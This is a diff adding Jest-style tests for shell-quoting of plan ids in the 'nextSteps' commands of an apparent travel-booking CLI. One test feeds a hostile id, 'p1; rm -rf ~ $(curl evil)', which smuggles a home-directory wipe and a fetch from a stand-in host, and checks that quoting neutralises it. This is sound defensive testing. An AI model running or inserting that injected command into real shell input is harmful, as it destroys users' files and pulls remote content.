@@ -609,3 +609,43 @@ describe("buildPlanStatus — misc contract", () => {
     expect(s.goals.map((g) => g.name)).toEqual(["First", "Second"]);
   });
 });
+
+// ── nextSteps shell safety (VOY-1709) ──
+
+describe("buildPlanStatus — nextSteps shell safety", () => {
+  it("shell-quotes hostile server ids so nextSteps stay safe to paste/run", () => {
+    const hostileId = "p1; rm -rf ~ $(curl evil)";
+    const s = buildPlanStatus(
+      {
+        tripPlan: plan({ id: hostileId, cart: bookableCart() }),
+        tripPlanGoals: [
+          goal({
+            isDecided: true,
+            checkoutReadiness: { isReady: true, requirements: [] },
+            items: [{ id: "i1", selections: [pickedSelection()] }],
+          }),
+        ],
+      },
+      BASE,
+    );
+    const bookStep = s.nextSteps.find((c) => c.startsWith("voyagier book"));
+    expect(bookStep).toBe("voyagier book 'p1; rm -rf ~ $(curl evil)' --dry-run");
+  });
+
+  it("leaves normal UUID ids unquoted (no behavior change for real data)", () => {
+    const s = buildPlanStatus(
+      {
+        tripPlan: plan({ cart: bookableCart() }),
+        tripPlanGoals: [
+          goal({
+            isDecided: true,
+            checkoutReadiness: { isReady: true, requirements: [] },
+            items: [{ id: "i1", selections: [pickedSelection()] }],
+          }),
+        ],
+      },
+      BASE,
+    );
+    expect(s.nextSteps).toEqual(["voyagier book plan-1 --dry-run"]);
+  });
+});
